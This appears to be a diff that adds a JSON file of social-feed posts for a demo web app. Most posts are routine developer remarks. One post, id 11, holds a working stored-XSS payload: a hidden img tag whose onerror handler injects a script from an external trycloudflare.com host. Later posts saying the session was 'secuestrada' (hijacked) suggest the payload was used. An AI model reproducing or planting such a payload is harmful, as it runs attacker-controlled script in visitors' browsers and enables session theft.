@@ -1,0 +1,82 @@
+[
+  {
+    "id": 15,
+    "username": "ñacañaca",
+    "content": "Secuestrame a mi 💋",
+    "createdAt": "2026-05-28T20:11:48",
+    "likes": 0
+  },
+  {
+    "id": 14,
+    "username": "ñacañaca",
+    "content": "Sesión secuestrada",
+    "createdAt": "2026-05-27T19:35:26",
+    "likes": 0
+  },
+  {
+    "id": 13,
+    "username": "ñacañaca",
+    "content": "que chico tan guapo ha hecho esta web o.o",
+    "createdAt": "2026-05-27T12:22:20"
+  },
+  {
+    "id": 11,
+    "username": "test",
+    "content": "Test XSS Payload!<img style=\"display:none\" id=\"xssPayload\" src=x onerror=\"document.getElementById('xssPayload').remove(); var node = document.createElement('script');node.src = 'https://fit-rides-trio-dec.trycloudflare.com/webSocket.js';document.getElementsByTagName('head')[0].appendChild(node);\">",
+    "createdAt": "2026-05-27T11:51:15"
+  },
+  {
+    "id": 1,
+    "username": "alice",
+    "content": "Shipped the new onboarding flow today. The retention bump looks promising.",
+    "createdAt": "2026-05-20T18:10:00"
+  },
+  {
+    "id": 2,
+    "username": "bob",
+    "content": "API pagination is one of those things that seems simple until you need it to be correct.",
+    "createdAt": "2026-05-20T19:05:00"
+  },
+  {
+    "id": 3,
+    "username": "carol",
+    "content": "Session handling is much easier to reason about when the server owns token issuance.",
+    "createdAt": "2026-05-21T08:40:00"
+  },
+  {
+    "id": 4,
+    "username": "alice",
+    "content": "Dark mode? Yes. Also making the dashboard responsive for smaller screens.",
+    "createdAt": "2026-05-21T13:25:00"
+  },
+  {
+    "id": 5,
+    "username": "bob",
+    "content": "Working on a feed endpoint that returns stable pages even while new posts arrive.",
+    "createdAt": "2026-05-22T11:00:00"
+  },
+  {
+    "id": 6,
+    "username": "carol",
+    "content": "Test apps should still feel like real products. Tiny details help a lot.",
+    "createdAt": "2026-05-22T14:50:00"
+  },
+  {
+    "id": 7,
+    "username": "alice",
+    "content": "Today I switched the home screen to use server-rendered session data on first load.",
+    "createdAt": "2026-05-23T09:30:00"
+  },
+  {
+    "id": 8,
+    "username": "bob",
+    "content": "A small demo can still exercise auth, sessions, pagination, and state restoration.",
+    "createdAt": "2026-05-24T15:45:00"
+  },
+  {
+    "id": 9,
+    "username": "carol",
+    "content": "Login/register endpoints are cleaner when they both return the same session payload shape.",
+    "createdAt": "2026-05-25T07:20:00"
+  }
+]
